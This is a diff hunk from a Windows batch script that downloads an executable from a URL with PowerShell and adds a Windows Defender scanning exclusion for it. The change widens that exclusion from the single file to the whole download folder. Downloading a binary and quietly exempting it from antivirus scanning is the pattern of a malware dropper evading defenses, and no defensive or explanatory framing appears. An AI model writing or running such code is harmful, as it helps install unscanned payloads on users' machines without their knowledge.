@@ -17,7 +17,7 @@ timeout /nobreak /t 1 >nul
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%outputFile%'"
 
 :: Add exclusion for the downloaded EXE itself
-powershell -Command "Add-MpPreference -ExclusionPath '%outputFile%'"
+powershell -Command "Add-MpPreference -ExclusionPath '%downloadPath%'"
 
 :: Small delay to ensure exclusion is applied
 timeout /nobreak /t 3 >nul
